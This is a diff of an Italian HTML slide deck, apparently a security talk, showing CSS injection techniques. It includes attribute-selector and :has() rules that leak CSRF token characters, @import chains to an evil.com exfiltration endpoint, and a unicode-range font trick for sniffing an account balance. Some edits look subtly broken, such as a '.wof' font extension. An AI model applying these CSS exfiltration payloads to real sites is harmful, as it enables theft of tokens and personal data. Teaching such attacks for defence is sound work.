@@ -104,17 +104,6 @@ input[name="csrf"][value$="="] ~ * {
   </div>
 </p-slide>
 <p-slide>
-  <h4 class="our-header">Hidden input per ultimi? No problem!</h4>
-  <pre class="language-css self-center"><code>form:has(input[name="csrf"][value^="a"]) {
-  background-image: url('http://evil.com/a.gif');
-}
-...
-form:has(input[name="csrf"][value$="="]) {
-  background-image: url('http://evil.com/is-base-64.gif');
-}
-...</code></pre>
-</p-slide>
-<p-slide>
   <h4 class="center">Sono solo un paio di byte&hellip; 🤷‍♀️</h4>
   <p-fragment>
     <h2 class="center">&hellip; oppure no? 😨</h2>
@@ -132,7 +121,6 @@ form:has(input[name="csrf"][value$="="]) {
 @import url(//evil.com/exfil?l=7);
 @import url(//evil.com/exfil?l=8);
 @import url(//evil.com/exfil?l=9);
-@import url(//evil.com/exfil?l=10);
 ...</code></pre>
     <p-fragment><video src="img/exfil.webm" alt="Clip di un log di rete durante esfiltrazione di dati" style="width: 100%;" autoplay loop muted></p-fragment>
   </div>
@@ -153,7 +141,7 @@ form:has(input[name="csrf"][value$="="]) {
       </div>
     </div>
     <p-fragment index="1">
-      <pre class="language-css"><code>#balance {
+      <pre class="language-css"><code>#bal {
   font-family: EvilSniff;
 }</code></pre>
     </p-fragment>
@@ -161,13 +149,13 @@ form:has(input[name="csrf"][value$="="]) {
       <pre class="language-html"><code>&lt;p>Salve, &lt;b>Mario Rossi&lt;/b>&lt;/p>
 &lt;div class="info">
   &lt;span>Saldo &euro;&lt;/span>
-  &lt;span id="balance">1.234,50&lt;/span>
+  &lt;span id="bal">1.234,50&lt;/span>
 &lt;/div></code></pre>
     </p-fragment>
     <p-fragment index="2">
       <pre class="language-css"><code>@font-face {
   font-family: EvilSniff;
-  src: url(http://evil.com/0.woff)
+  src: url(http://evil.com/0.wof)
        format('woff');
   unicode-range: U+0040;
 }</code></pre>
@@ -191,7 +179,7 @@ form:has(input[name="csrf"][value$="="]) {
   <pre class="language-css self-center" style="width: 80%;"><code>@font-face {
   font-family: 'Material Icons';
   src: local('Material Icons'),
-    url(https://gfonts.com/MaterialIcons.woff) format('woff');
+    url(//gfonts.com/MaterialIcons.woff) format('woff');
 }</code></pre>
   <div class="two-columns align-center self-center" style="width: 80%;">
     <p-fragment>
